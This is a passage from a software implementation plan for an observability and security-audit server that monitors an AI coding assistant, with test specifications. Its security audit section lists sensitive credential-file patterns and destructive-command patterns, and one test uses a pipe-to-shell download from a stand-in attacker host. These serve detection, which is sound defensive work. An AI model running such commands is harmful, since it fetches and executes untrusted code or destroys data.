- Unit test: re-reading — `Read(a.ts), Read(b.ts), Read(a.ts), Read(c.ts), Read(a.ts), Read(a.ts)` -> detected on `a.ts` with `readCount: 4`
- Unit test: stuck loop — `Bash("npm test"), Bash("npm test"), Bash("npm test"), Bash("npm test")` -> detected with `repeatCount: 4`
- Unit test: stuck loop — `Bash("npm test"), Bash("npm run build"), Bash("npm test")` -> not detected (different commands between)
- Unit test: blind editing — `Edit(a.ts), Edit(a.ts), Edit(a.ts), Edit(a.ts)` with no Bash between -> detected
- Unit test: blind editing — `Edit(a.ts), Bash(test), Edit(a.ts)` -> not detected (verification between edits)
- Unit test: over-delegation — 5 Agent tool calls in one task -> detected
- Unit test: `readEfficiency` — 15 Read calls on 5 unique files -> 0.33
- Unit test: `verifyRate` — 8 edits, 3 followed by test -> 0.375

---

### ✅ 2.4 — AI Coding Efficiency Score

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/metrics/efficiency-score.ts`
- Implement the composite efficiency score from Section 5.1:
  ```
  Efficiency Score = normalize(
    (lines_changed / task_duration_ms)        * 0.25  // raw output speed
    + test_pass_rate_after_change              * 0.25  // correctness
    + (1 - user_corrections / turns)           * 0.25  // autonomy
    + (1 - compile_error_fix_iterations / 3)   * 0.25  // first-attempt quality
  )
  ```
- Implement `EfficiencyScorer` class:
  - `computeScore(task: Task): EfficiencyScore` — compute the score for a completed task
  - Component breakdown:
    - **Speed** (0-1): `linesChanged / taskDurationMs`, normalized against a baseline (e.g., 1 line/second = 1.0, 0.1 line/second = 0.1)
    - **Correctness** (0-1): percentage of test runs that passed during the task; if no tests were run, default to 0.5 (neutral)
    - **Autonomy** (0-1): `1 - (askUserCount / totalTurns)` — lower user interaction = higher autonomy; if no user questions, score is 1.0
    - **First-attempt quality** (0-1): `1 - (thrashIterations / 3)` — clamped to 0.0 floor; if no thrashing detected, score is 1.0
  - The final score is the weighted average, clamped to [0, 1]
  - Return: `{ score, components: { speed, correctness, autonomy, firstAttemptQuality }, taskId, timestamp }`
- Expose as MCP tool: `nr_observe_get_efficiency_score`:
  - Input: none (returns score for the most recent completed task, or session-wide rolling average)
  - Output: the `EfficiencyScore` object
- Emit `ai.efficiency.score` (gauge) and per-component gauges at each harvest
- Emit `AiEfficiencyScore` custom event per task

**Testing:**

- Unit test: perfect task (fast, all tests pass, no user questions, no thrashing) -> score near 1.0
- Unit test: poor task (slow, all tests fail, many user corrections, thrashing) -> score near 0.0
- Unit test: task with no tests run -> correctness defaults to 0.5
- Unit test: task with no user questions -> autonomy = 1.0
- Unit test: task with 3 thrash iterations -> first-attempt quality = 0.0
- Unit test: speed normalization — 50 lines in 60 seconds vs 5 lines in 60 seconds produces proportionally different speed scores
- Unit test: score is clamped to [0, 1] even with extreme input values
- Unit test: `nr_observe_get_efficiency_score` MCP tool returns the correct JSON structure
- Unit test: session-wide rolling average across 5 tasks is computed correctly

---

### ✅ 2.5 — Cost & Workflow MCP Tools

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/tools/cost-tools.ts` and `packages/nr-ai-mcp-server/src/tools/workflow-tools.ts`
- Register additional MCP tools from Section 6.1:
- **`nr_observe_get_cost_breakdown`**:
  - Input: none
  - Output: cost breakdown for the current session:
    ```json
    {
      "total_usd": 2.31,
      "by_model": { "claude-sonnet-4": 2.31 },
      "by_task": [
        {
          "task_id": "task-1",
          "description": "Fix auth test",
          "cost_usd": 1.87,
          "tokens_used": 24500
        },
        {
          "task_id": "task-2",
          "description": "Update README",
          "cost_usd": 0.44,
          "tokens_used": 5800
        }
      ],
      "cost_per_line_of_code": 0.023,
      "cost_per_file_modified": 0.77,
      "tokens": { "input": 28000, "output": 6500, "thinking": 4200 }
    }
    ```
  - Pulls data from `CostTracker` (2.1) and `TaskDetector` (2.2)
- **`nr_observe_get_workflow_trace`**:
  - Input: optional `{ task_id: string }` to specify which task (default: most recent)
  - Output: the complete tool call trace for a task, as a tree structure:
    ```json
    {
      "task_id": "task-1",
      "duration_ms": 12400,
      "estimated_cost_usd": 1.87,
      "tool_calls": [
        {
          "seq": 1,
          "tool": "Read",
          "target": "src/auth.test.ts",
          "duration_ms": 32,
          "success": true
        },
        { "seq": 2, "tool": "Read", "target": "src/auth.ts", "duration_ms": 28, "success": true },
        { "seq": 3, "tool": "Edit", "target": "src/auth.ts", "duration_ms": 18, "success": true },
        {
          "seq": 4,
          "tool": "Bash",
          "target": "npm test",
          "duration_ms": 4800,
          "success": true,
          "exit_code": 0
        }
      ],
      "anti_patterns": [],
      "efficiency_score": 0.82
    }
    ```
- **`nr_observe_get_anti_patterns`**:
  - Input: none
  - Output: list of detected anti-patterns in the current session or most recent task:
    ```json
    [
      {
        "type": "thrashing",
        "file": "auth.test.ts",
        "iterations": 4,
        "suggestion": "Consider reading the test output more carefully"
      },
      {
        "type": "re_reading",
        "file": "config.ts",
        "read_count": 5,
        "suggestion": "Context may have been compressed"
      }
    ]
    ```
- **`nr_observe_report_feedback`**:
  - Input: `{ quality: 'good' | 'bad' | 'neutral', notes?: string, task_id?: string }`
  - Records user quality feedback for the specified task (or current task)
  - Emit `AiQualityFeedback` event to NR with the feedback and task context

**Testing:**

- Unit test: `nr_observe_get_cost_breakdown` returns correct structure after 2 tasks with known costs
- Unit test: `by_task` array matches completed tasks from `TaskDetector`
- Unit test: `nr_observe_get_workflow_trace` returns tool calls in correct sequence for the specified task
- Unit test: `nr_observe_get_workflow_trace` with no `task_id` returns the most recent task
- Unit test: `nr_observe_get_anti_patterns` returns detected patterns from `AntiPatternDetector`
- Unit test: `nr_observe_report_feedback` with `quality: 'good'` emits an `AiQualityFeedback` event
- Unit test: all tools appear in `tools/list` with correct schemas
- Unit test: calling tools when no data exists (fresh session) returns empty/zero results, not errors

---

### ✅ 2.6 — Pre-Built Dashboard: "AI Coding Assistant — Team View"

**Implementation:**

- Create `packages/nr-ai-mcp-server/dashboards/ai-coding-assistant-team-view.json`
- Build the "Team View" dashboard from Section 7:
  - **Row 1 — Team summary (last 7 days)** (Billboard widgets):
    - Total team AI spend (`SELECT sum(ai.cost.session_total_usd) FROM Metric SINCE 7 days ago`)
    - Average efficiency score (`SELECT average(ai.efficiency.score) FROM Metric SINCE 7 days ago`)
    - Total tasks completed (`SELECT count(*) FROM AiCodingTask SINCE 7 days ago`)
    - Average cost per task (`SELECT average(estimatedCostUsd) FROM AiCodingTask SINCE 7 days ago`)
    - Task success rate (`SELECT percentage(count(*), WHERE testsPassed > 0) FROM AiCodingTask SINCE 7 days ago`)
  - **Row 2 — Developer comparison** (Bar charts):
    - Efficiency score by developer (`SELECT average(ai.efficiency.score) FROM Metric FACET developer SINCE 7 days ago`)
    - Cost per developer (`SELECT sum(ai.cost.session_total_usd) FROM Metric FACET developer SINCE 7 days ago`)
    - Tasks completed per developer (`SELECT count(*) FROM AiCodingTask FACET developer SINCE 7 days ago`)
  - **Row 3 — Trends** (Line charts):
    - Weekly efficiency score trend (`SELECT average(ai.efficiency.score) FROM Metric FACET developer TIMESERIES 1 day SINCE 30 days ago`)
    - Weekly cost trend (`SELECT sum(ai.cost.session_total_usd) FROM Metric TIMESERIES 1 day SINCE 30 days ago`)
    - Anti-pattern frequency trend (`SELECT count(*) FROM AiAntiPattern FACET type TIMESERIES 1 day SINCE 30 days ago`)
  - **Row 4 — Optimization** (Table + Bar charts):
    - Top 10 most expensive tasks (`SELECT max(estimatedCostUsd) FROM AiCodingTask FACET taskId SINCE 7 days ago LIMIT 10`)
    - Most common anti-patterns (`SELECT count(*) FROM AiAntiPattern FACET type SINCE 7 days ago`)
    - Tool call patterns by developer (`SELECT count(*) FROM AiToolCall FACET tool, developer SINCE 7 days ago`)
- Update deploy script to support this dashboard

**Testing:**

- Unit test: dashboard JSON is valid and follows NR structure
- Unit test: all NRQL queries are syntactically valid
- Manual test: deploy to test NR account; verify widgets render

---

## Phase 3: MCP Proxy + Security Audit (3-4 weeks)

> **Goal**: Intercept MCP server traffic and provide security visibility.

### 3.1 — MCP Proxy Server with Transparent Forwarding

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/proxy/proxy-server.ts`
- Implement an HTTP-based MCP proxy that sits between Claude Code and upstream MCP servers (per Section 3, Layer [2]):
  - The proxy listens on `http://localhost:{port}/proxy/{server-name}` endpoints
  - Each endpoint acts as a full MCP server (SSE/HTTP transport) that forwards all JSON-RPC requests to the real upstream server
  - **Upstream connection management:**
    - `ProxyUpstream` class: connects to a real upstream MCP server (via HTTP, SSE, or stdio)
    - Maintains a `Map<string, ProxyUpstream>` — one connection per upstream server name
    - Configuration: upstream server URLs loaded from config file or auto-discovered from Claude Code's `settings.json`
  - **Request interception:**
    - Every `tools/call` request is intercepted before forwarding:
      1. Record timestamp and request metadata (tool name, arguments)
      2. Forward to upstream unchanged
      3. Record response metadata (output size, success/failure, duration)
      4. Return response to Claude Code unchanged
    - Also intercept `tools/list`, `resources/list`, `resources/read` to track discovery patterns
  - **Transparent forwarding guarantees:**
    - Response content is never modified — bit-for-bit passthrough
    - Streaming responses (SSE) are forwarded chunk-by-chunk without buffering
    - Error responses propagate unchanged (same HTTP status, same error body)
    - Request headers (including auth tokens) are forwarded to upstream
  - **Performance budget:** proxy overhead must be <10ms per request (measurement bookkeeping only)
- Implement `ProxyManager` class:
  - `registerUpstream(name: string, config: UpstreamConfig)` — register an upstream server
  - `start()` — start the HTTP proxy server on the configured port
  - `stop()` — gracefully disconnect all upstream connections
- Each intercepted tool call produces a `ProxyToolCallRecord` (similar to `ToolCallRecord` but with additional `serverName`, `upstreamLatencyMs` fields)

**Testing:**

- Unit test: proxy registers an upstream and creates a route at `/proxy/{name}`
- Unit test: `tools/call` request is forwarded to upstream and response is returned unchanged
- Unit test: tool call timing — proxy records `durationMs` that includes upstream latency
- Unit test: `tools/list` is forwarded and response is captured
- Unit test: error from upstream (500) propagates to the caller with the same status and body
- Unit test: streaming SSE response is forwarded chunk-by-chunk (mock a streaming upstream)
- Unit test: proxy overhead is <10ms (benchmark test with a mock upstream that responds in 0ms)
- Unit test: auth headers are forwarded to upstream
- Unit test: proxy records a `ProxyToolCallRecord` for each intercepted call
- Integration test: proxy a mock MCP server; verify tool calls round-trip correctly and observability data is captured

---

### 3.2 — Upstream MCP Server Metrics (Latency, Errors, Tool Popularity)

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/metrics/proxy-metrics.ts`
- Implement `ProxyMetricsTracker` that aggregates proxy-layer observability from Section 4.5:
  - **Per-server aggregates:**
    - `callCount`: total calls to each upstream server
    - `latencyMs`: `{ count, sum, min, max, p95 }` per server
    - `errorRate`: percentage of calls that failed per server
    - `errorsByType`: `Map<string, number>` — errors classified (timeout, auth failure, server error, etc.)
    - `payloadSizeBytes`: average request/response payload sizes
  - **Cross-server aggregates:**
    - `toolPopularity`: most-called MCP tools across all servers (`SELECT count(*) FROM AiMcpToolCall FACET tool, server`)
    - `totalProxiedCalls`: total calls proxied
    - `avgProxyOverheadMs`: average time the proxy adds to requests
  - `recordProxyCall(record: ProxyToolCallRecord)` — update all aggregates
- Emit as custom events: `AiMcpToolCall` per proxied call, with attributes:
  - `server`, `tool`, `duration_ms`, `upstream_latency_ms`, `proxy_overhead_ms`, `success`, `error_type`, `request_size_bytes`, `response_size_bytes`
- Emit as aggregated metrics at 60s harvest:
  - `ai.mcp.server_call_count` (counter, per server)
  - `ai.mcp.server_latency_ms` (summary, per server)
  - `ai.mcp.server_error_rate` (gauge, per server)
  - `ai.mcp.proxy_overhead_ms` (gauge)

**Testing:**

- Unit test: 10 calls to "nr-mcp-server" and 5 to "confluence" -> correct per-server `callCount`
- Unit test: latency stats — 10 calls with known durations -> correct min, max, sum, p95
- Unit test: error rate — 2 failures out of 10 calls -> 20% for that server
- Unit test: `toolPopularity` correctly ranks tools across servers
- Unit test: `AiMcpToolCall` event includes all expected attributes
- Unit test: `proxy_overhead_ms = duration_ms - upstream_latency_ms` is computed correctly
- Unit test: `payloadSizeBytes` correctly measures request and response sizes

---

### 3.3 — Security Audit Trail (File Access, Bash Commands, External Requests)

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/security/audit-trail.ts`
- Implement the comprehensive audit trail from Section 5.6:
  - **Tracked events** (every tool call generates an audit entry):
    - `FileRead`: path, timestamp, session_id, developer
    - `FileWrite`: path, timestamp, diff summary (lines added/removed), session_id
    - `FileEdit`: path, timestamp, edit type (insert/replace/delete), session_id
    - `BashCommand`: command, exit_code, working_directory, timestamp, session_id
    - `McpToolCall`: server, tool, arguments summary, timestamp, session_id
    - `AgentSpawn`: description, subagent_type, isolation_mode, timestamp
  - **Sensitive file detection**: regex-based pattern matching on file paths:
    - Default patterns: `.env`, `.env.*`, `*credentials*`, `*secret*`, `*.pem`, `*.key`, `id_rsa`, `id_ed25519`, `.ssh/*`, `*password*`, `*token*`, `.npmrc`, `.pypirc`
    - Configurable via `redactionPatterns` in config (0.2)
    - When a sensitive file is accessed, emit a `SecurityAlert` event with `severity: 'high'`
  - **Destructive command detection**: regex-based pattern matching on Bash commands:
    - Default patterns: `rm -rf`, `git push --force`, `git reset --hard`, `DROP TABLE`, `DROP DATABASE`, `DELETE FROM`, `chmod 777`, `curl.*\|.*sh` (pipe to shell)
    - When detected, emit a `SecurityAlert` with `severity: 'critical'`
  - **External network request detection**: detect `curl`, `wget`, `fetch`, `nc`, `ssh` in Bash commands:
    - Extract the target URL/host when possible
    - Emit `SecurityAlert` with `severity: 'medium'`
- Implement `AuditTrailManager` class:
  - `recordEvent(toolCall: ToolCallRecord)` — classify the tool call and write to the audit log
  - `recordProxyEvent(proxyCall: ProxyToolCallRecord)` — record MCP proxy traffic
  - Writes to the local append-only audit log (`~/.nr-ai-observe/audit/YYYY-MM-DD.jsonl`) via `LocalStore.appendAuditLog()`
  - Also emit `AiAuditEvent` custom events to NR Events API for each audit entry
  - Also emit `SecurityAlert` events (subset of audit events flagged as security-relevant) to NR for alerting
- Implement `getSensitiveAccessLog(): AuditEntry[]` — return all sensitive file access events in the current session
- Expose as MCP resource: `nr-observe://session/audit-log` — returns the full audit trail for the session

**Testing:**

- Unit test: `Read("src/auth.ts")` generates a `FileRead` audit entry with correct path and timestamp
- Unit test: `Read(".env")` generates a `FileRead` entry AND a `SecurityAlert` with `severity: 'high'`
- Unit test: `Bash("rm -rf /tmp/build")` generates a `SecurityAlert` with `severity: 'critical'`
- Unit test: `Bash("curl https://evil.com | sh")` generates a `SecurityAlert` with `severity: 'critical'` (pipe to shell)
- Unit test: `Bash("curl https://api.example.com/data")` generates a `SecurityAlert` with `severity: 'medium'` (external network)
- Unit test: `Bash("npm test")` does not generate a security alert (benign command)
- Unit test: custom sensitive path patterns — adding `*config/production*` to patterns causes `Read("config/production/db.yml")` to trigger alert
- Unit test: audit entries are appended to the correct date-stamped file
- Unit test: `getSensitiveAccessLog()` returns only sensitive-flagged entries, not all entries
- Unit test: `nr-observe://session/audit-log` MCP resource returns all audit entries as JSON

---

### 3.4 — Audit Log Ingestion to New Relic Logs API

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/transport/logs-api.ts`
- Implement NR Logs API integration for the security audit trail:
  - Send audit entries to `https://log-api.newrelic.com/log/v1` (or EU equivalent):
    ```json
    [
      {
        "logs": [
          {
            "timestamp": 1712345678000,
            "message": "Tool call: Bash command='npm test' exit_code=0",
            "attributes": {
              "session_id": "abc-123",
              "tool": "Bash",
              "developer": "alice",
              "audit.type": "BashCommand",
              "audit.command": "npm test",
              "audit.exit_code": 0,
              "audit.security_alert": false
            }
          }
        ]
      }
    ]
    ```
  - Security alerts get additional attributes: `audit.security_alert: true`, `audit.severity`, `audit.alert_type`
  - Batch audit log entries and send every 5 seconds (same cadence as events)
  - Use gzip compression for payloads
  - Support the same retry/backoff logic as the Events API transport
- Log entries in NR enable:
  - Full-text search across audit trails (`SELECT * FROM Log WHERE audit.type = 'BashCommand' AND audit.command LIKE '%rm -rf%'`)
  - SIEM integration via NR log forwarding (per Section 5.6 compliance features)
  - Long-term retention configured via NR data retention policies
- Integrate with `AuditTrailManager` (3.3): after writing locally, also queue for NR Logs API delivery

**Testing:**

- Unit test: audit entries are correctly formatted for the NR Logs API payload structure
- Unit test: security alert attributes are included on flagged entries
- Unit test: batch sends — 15 audit entries in 5 seconds -> sent as a single batch
- Unit test: gzip compression applied to the payload
- Unit test: retry logic handles 429 and 500 responses from Logs API
- Unit test: EU region routes to `log-api.eu.newrelic.com`
- Integration test: send test log entries to real NR Logs API; verify they appear in NR log queries (requires credentials; skip in CI)

---

### 3.5 — Pre-Built Dashboard: "AI Coding Assistant — Security Audit"

**Implementation:**

- Create `packages/nr-ai-mcp-server/dashboards/ai-coding-assistant-security.json`
- Build the "Security Audit" dashboard from Section 7:
  - **Row 1 — Security alerts** (Billboard + Table):
    - Total security alerts today (`SELECT count(*) FROM AiAuditEvent WHERE audit.security_alert = true SINCE today`)
    - Critical alerts (`SELECT count(*) FROM AiAuditEvent WHERE audit.severity = 'critical' SINCE today`)
    - Recent security alerts table (`SELECT timestamp, audit.type, audit.severity, tool, developer, message FROM AiAuditEvent WHERE audit.security_alert = true SINCE 24 hours ago LIMIT 50`)
  - **Row 2 — File access audit** (Table + Bar):
    - Complete tool call audit trail (`SELECT timestamp, tool, file_path, developer FROM AiToolCall SINCE 1 hour ago ORDER BY timestamp DESC LIMIT 100`)
    - Sensitive file accesses (`SELECT count(*) FROM AiAuditEvent WHERE audit.type = 'FileRead' AND audit.security_alert = true FACET file_path SINCE 7 days ago`)
  - **Row 3 — Bash command history** (Table + Bar):
    - Bash command log (`SELECT timestamp, audit.command, audit.exit_code, developer FROM AiAuditEvent WHERE audit.type = 'BashCommand' SINCE 1 hour ago ORDER BY timestamp DESC LIMIT 100`)
    - Destructive command attempts (`SELECT count(*) FROM AiAuditEvent WHERE audit.type = 'BashCommand' AND audit.severity = 'critical' FACET audit.command SINCE 7 days ago`)
  - **Row 4 — External access + MCP** (Table + Chart):
    - External network requests (`SELECT count(*) FROM AiAuditEvent WHERE audit.type = 'BashCommand' AND audit.severity = 'medium' FACET audit.command SINCE 7 days ago`)
    - MCP server access patterns (`SELECT count(*) FROM AiMcpToolCall FACET server, tool SINCE 7 days ago`)
    - Permission denial log (`SELECT count(*) FROM AiToolCall WHERE success = false FACET tool, error_type SINCE 7 days ago`)
- Update deploy script to include this dashboard

**Testing:**

- Unit test: dashboard JSON is valid NR dashboard structure
- Unit test: all NRQL queries are syntactically valid
- Manual test: deploy to test NR account; verify all widgets render

---

## Phase 4: Cross-Session Intelligence (3-4 weeks)

> **Goal**: Historical analysis and optimization recommendations. Build local persistence for session summaries, then compute longitudinal metrics across sessions — trends, collaboration profiles, CLAUDE.md impact, cost-per-outcome, and automated recommendations.

### 4.1 — Local Session Persistence and Weekly Summaries

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/storage/session-store.ts`
- Implement `SessionStore` for persisting session summaries to `~/.nr-ai-observe/sessions/` (per Section 6.5):
  - **Session summary schema** (`SessionSummary` interface):
    - `sessionId: string` — unique session identifier
    - `developer: string` — developer name from config
    - `startTime: number` — epoch ms
    - `endTime: number` — epoch ms
    - `durationMs: number` — total session duration
    - `model: string` — primary model used
    - `toolCallCount: number` — total tool calls
    - `toolBreakdown: Record<string, number>` — calls per tool type
    - `filesRead: string[]` — unique files read
    - `filesModified: string[]` — unique files modified
    - `linesAdded: number` / `linesRemoved: number`
    - `bashCommandCount: number` — Bash invocations
    - `testRunCount: number` / `testPassCount: number`
    - `buildRunCount: number` / `buildPassCount: number`
    - `estimatedCostUsd: number` — from the cost engine (Phase 2)
    - `tokensInput: number` / `tokensOutput: number` / `tokensThinking: number`
    - `efficiencyScore: number` — from the efficiency scorer (Phase 2)
    - `antiPatterns: { type: string; count: number }[]` — detected anti-patterns
    - `taskCount: number` — detected task boundaries
    - `taskSuccessRate: number` — % of tasks that ended with passing tests
    - `contextCompressions: number` — detected context compressions
    - `agentSpawns: number` — sub-agent invocations
    - `userMessages: number` / `assistantMessages: number`
    - `userCorrections: number` — detected user corrections
    - `outcome: string` — auto-classified outcome category (bug_fix, feature, refactor, investigation, etc.)
  - `saveSession(summary: SessionSummary)` — write to `~/.nr-ai-observe/sessions/{YYYY-MM-DD}_{sessionId}.json`
  - `loadSession(sessionId: string)` — load a single session summary
  - `listSessions(options?: { since?: Date; developer?: string })` — list session files with optional filters
  - `loadAllSessions(options?: { since?: Date; developer?: string })` — load and parse all matching summaries
- Create `packages/nr-ai-mcp-server/src/storage/weekly-summary.ts`
- Implement `WeeklySummaryGenerator`:
  - Aggregates all sessions within an ISO week (`YYYY-Wnn`) into a weekly summary file at `~/.nr-ai-observe/weekly_summaries/{YYYY-Wnn}.json`
  - **Weekly summary schema** (`WeeklySummary` interface):
    - `week: string` — ISO week identifier
    - `developers: string[]` — all developers active this week
    - `sessionCount: number`
    - `totalCostUsd: number` / `avgCostPerSession: number`
    - `avgEfficiencyScore: number`
    - `totalToolCalls: number` / `toolBreakdown: Record<string, number>`
    - `totalTasksCompleted: number` / `taskSuccessRate: number`
    - `antiPatternCounts: Record<string, number>`
    - `perDeveloper: Record<string, DeveloperWeeklyStats>` — per-developer breakdown of all above
  - `generate(weekId: string)` — compute and save the weekly summary from individual session files
  - `getLatest()` — return the most recent weekly summary
  - Auto-generation: when the MCP server starts, check if last week's summary exists; if not, generate it
- Hook into the session lifecycle: when a session ends (detected by inactivity timeout or explicit end signal), call `SessionStore.saveSession()` with the current session's accumulated metrics

**Testing:**

- Unit test: `saveSession` writes a valid JSON file to the expected path
- Unit test: `loadSession` reads and parses a saved session correctly
- Unit test: `listSessions` filters by date range — only returns sessions within the range
- Unit test: `listSessions` filters by developer name
- Unit test: `WeeklySummaryGenerator.generate()` aggregates 5 sessions into correct weekly totals
- Unit test: per-developer breakdown correctly partitions metrics
- Unit test: auto-generation check — generates last week's summary if missing, skips if it exists
- Unit test: session file naming follows `YYYY-MM-DD_sessionId.json` pattern
- Integration test: full lifecycle — start session, record tool calls, end session, verify session file written with correct metrics

---

### 4.2 — Cross-Session Trend Analysis

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/metrics/trend-analyzer.ts`
- Implement `TrendAnalyzer` that computes longitudinal metrics from Section 5.7:
  - **Input:** `SessionSummary[]` loaded from `SessionStore` (filtered by date range)
  - **Computed trends** (all per-developer and aggregate):
    - `weeklyEfficiencyTrend: { week: string; score: number }[]` — average efficiency score per week
    - `weeklyCostTrend: { week: string; cost: number }[]` — total cost per week
    - `weeklyTaskSuccessTrend: { week: string; rate: number }[]` — task success rate per week
    - `weeklyToolCallTrend: { week: string; count: number }[]` — average tool calls per task per week
    - `weeklyAntiPatternTrend: { week: string; counts: Record<string, number> }[]` — anti-pattern frequency per week
  - **Comparison generators:**
    - `compareWeeks(weekA: string, weekB: string)` — returns a `WeekComparison` with delta and % change for all metrics
    - `compareDeveloperToTeam(developer: string, weekId: string)` — how one developer compares to the team average
    - `detectModelMigrationImpact(modelA: string, modelB: string)` — isolate sessions by model, compare metric distributions
  - **Statistical helpers:**
    - `movingAverage(values: number[], windowSize: number)` — smoothed trend line
    - `percentChange(oldValue: number, newValue: number)` — with direction (improved/degraded) based on metric type (lower cost = improved, higher efficiency = improved)
    - `significantChange(values: number[], threshold: number)` — detect if a change is beyond normal variance (simple z-score based)
  - **Text summary generation:**
    - `generateWeekSummary(weekId: string)` — human-readable summary like: "This week: avg session cost $3.42 (↓16% vs last week), efficiency 0.72 (↑8%), task success 87% (↑8pp)"
    - Used by MCP tools to return summaries to Claude Code
- Emit cross-session metrics to New Relic at weekly summary generation time:
  - `AiWeeklySummary` custom event with all weekly aggregates as attributes
  - `ai.trend.efficiency_score_weekly` (gauge, per developer)
  - `ai.trend.cost_weekly` (gauge, per developer)
  - `ai.trend.task_success_rate_weekly` (gauge, per developer)

**Testing:**

- Unit test: 4 weeks of mock session data → correct weekly efficiency trend (ascending weeks)
- Unit test: weekly cost trend aggregates correctly across multiple sessions per week
- Unit test: `compareWeeks` returns correct deltas and percentage changes (including sign)
- Unit test: `compareDeveloperToTeam` — developer with efficiency 0.8 vs team average 0.6 → correct delta
- Unit test: `detectModelMigrationImpact` — sessions with "opus" average $4 vs "sonnet" average $2 → correct comparison
- Unit test: `percentChange` correctly interprets direction (lower cost = improved, higher efficiency = improved)
- Unit test: `significantChange` — 5 weeks of scores around 0.7, then 0.9 → detects significant improvement
- Unit test: `generateWeekSummary` produces a readable string with correct metrics and arrow indicators
- Unit test: `movingAverage` with window 3 smooths correctly
- Unit test: `AiWeeklySummary` event includes all expected attributes

---

### 4.3 — Developer Collaboration Profile

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/metrics/collaboration-profile.ts`
- Implement `CollaborationProfiler` based on Section 5.3:
  - **Input:** `SessionSummary[]` for a given developer (loaded from `SessionStore`)
  - **Four profile dimensions** (each normalized to 0–1):
    1. **Specificity** — how detailed are the developer's prompts?
       - Proxy: average `userMessages` length (from transcript metadata if available), presence of file paths in prompts, ratio of tool calls to user messages (fewer messages per tool call = higher specificity)
       - Fallback heuristic: `toolCallCount / userMessages` — high ratio means the developer gives specific instructions that require less back-and-forth
    2. **Autonomy** — how much does the developer let the AI work independently?
       - Calculated from: `toolCallCount / userMessages` (tool calls between user messages), low `userCorrections / userMessages`, low permission denial rate
       - High autonomy = longer uninterrupted tool sequences, fewer corrections
    3. **Correction Frequency** — how often does the developer redirect the AI?
       - Calculated from: `userCorrections / userMessages`
       - Inverted for scoring: low correction = high score
    4. **Task Complexity** — what kind of work does this developer give to AI?
       - Calculated from: average `toolCallCount` per task, average files touched per task, `agentSpawns` per task
       - Normalized against team baselines
  - **Profile output** (`DeveloperProfile` interface):
    - `developer: string`
    - `dimensions: { specificity: number; autonomy: number; correctionRate: number; taskComplexity: number }` — each 0–1
    - `weeklyProfiles: { week: string; dimensions: ... }[]` — profile evolution over time
    - `classification: string` — auto-classified style: "Power User" (high specificity + high autonomy), "Collaborative" (moderate specificity + moderate corrections), "Learning" (low specificity + high corrections), "Delegator" (low specificity + high autonomy)
  - `computeProfile(developer: string, options?: { since?: Date })` — build profile from historical sessions
  - `computeTeamBaseline(options?: { since?: Date })` — compute team average profile for comparison
  - `compareToTeam(developer: string)` — radar chart data: developer dimensions vs team average
- Emit as custom event: `AiDeveloperProfile` per developer per week with all four dimension scores
- Expose via MCP tool: `get_collaboration_profile` — returns the requesting developer's profile and comparison to team

**Testing:**

- Unit test: developer with high `toolCallCount / userMessages` (20:3) and low corrections → high specificity + high autonomy
- Unit test: developer with low `toolCallCount / userMessages` (5:4) and high corrections → low specificity + high correction
- Unit test: task complexity scales with files touched and agent spawns
- Unit test: classification logic — all four classifications produce correct labels for extreme profiles
- Unit test: `computeTeamBaseline` averages across 3 developers correctly
- Unit test: `compareToTeam` produces delta values (developer minus baseline) for each dimension
- Unit test: weekly profile evolution — 4 weeks of data shows trend in each dimension
- Unit test: normalization — all dimensions clamp to [0, 1]
- Unit test: `AiDeveloperProfile` event includes all dimension scores

---

### 4.4 — CLAUDE.md Change Impact Tracking

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/metrics/claudemd-tracker.ts`
- Implement `ClaudeMdTracker` based on Section 5.8:
  - **Change detection:**
    - Monitor `CLAUDE.md` (and `.claude/` directory) for modifications during sessions via the hook collector:
      - If a `Write` or `Edit` tool call targets a file matching `**/CLAUDE.md` or `**/.claude/**`, record a `ClaudeMdChange` event
    - Also detect changes between sessions: on session start, compute a hash of the project's `CLAUDE.md` file(s) and compare against the hash stored in the previous session's summary
    - `ClaudeMdChange` record: `{ timestamp, sessionId, filePath, changeType: 'created' | 'modified' | 'deleted', diffSummary: string, linesAdded: number, linesRemoved: number }`
  - **Before/after metric comparison:**
    - When a `CLAUDE.md` change is detected, partition sessions into "before" (sessions before the change) and "after" (sessions after the change)
    - `computeImpact(changeTimestamp: number, windowDays: number = 7)` — compare metrics in the N days before vs N days after:
      - `efficiencyScoreDelta` — did efficiency improve?
      - `costDelta` — did costs change?
      - `correctionRateDelta` — did the AI need fewer corrections?
      - `toolCallsPerTaskDelta` — did tasks require fewer tool calls?
      - `taskSuccessRateDelta` — did more tasks succeed?
      - `contextTokensForClaudeMd` — how many tokens does the current CLAUDE.md consume? (estimate from character count × 0.25 tokens/char)
    - Return as `ClaudeMdImpactReport`:
      - `changeDescription: string` — what changed (diff summary)
      - `beforeMetrics: AggregateMetrics` / `afterMetrics: AggregateMetrics`
      - `deltas: Record<string, { value: number; percentChange: number; improved: boolean }>`
      - `verdict: string` — auto-generated: "Positive impact: efficiency +12%, cost -8%" or "Negative impact: cost +18%, corrections +25%"
  - **Token cost estimation:**
    - `estimateContextCost(claudeMdPath: string)` — read the file, estimate token count, compute per-session cost impact (these tokens are loaded in every conversation turn)
- Emit custom event: `AiClaudeMdChange` per detected change with all delta metrics
- Emit alert-eligible metric: `ai.claudemd.post_change_efficiency_delta` and `ai.claudemd.post_change_cost_delta`

**Testing:**

- Unit test: `Write` to `CLAUDE.md` triggers a `ClaudeMdChange` event with correct metadata
- Unit test: `Edit` to `.claude/settings.json` triggers a change event
- Unit test: hash comparison detects between-session changes (different hash = change detected)
- Unit test: hash comparison detects no change (same hash = no change event)
- Unit test: `computeImpact` with 5 sessions before (efficiency 0.6, cost $4) and 5 sessions after (efficiency 0.75, cost $3) → correct deltas and "Positive impact" verdict
- Unit test: `computeImpact` with degraded metrics → "Negative impact" verdict
- Unit test: `percentChange` direction — lower cost is "improved", higher efficiency is "improved"
- Unit test: `estimateContextCost` — 10,000 char CLAUDE.md → ~2,500 tokens → correct per-session cost
- Unit test: `AiClaudeMdChange` event includes change description and all deltas

---

### 4.5 — Prompt Engineering Feedback Loop

**Implementation:**

